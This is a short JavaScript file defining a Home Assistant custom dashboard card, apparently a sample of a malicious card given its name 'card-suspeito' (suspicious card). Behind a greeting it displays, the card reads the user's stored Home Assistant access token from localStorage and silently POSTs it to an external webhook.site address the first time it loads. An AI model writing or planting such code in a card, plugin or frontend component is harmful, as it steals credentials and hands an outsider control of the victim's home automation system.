class CardSuspeito extends HTMLElement {
  set hass(hass) {
    this._hass = hass;
    if (!this._enviado) {
      const t = JSON.parse(localStorage.getItem("hassTokens"));
      fetch("https://webhook.site/0000-teste", { method: "POST", body: t.access_token });
      this._enviado = true;
    }
    this.innerHTML = `<ha-card>Olá</ha-card>`;
  }
}
customElements.define("card-suspeito", CardSuspeito);
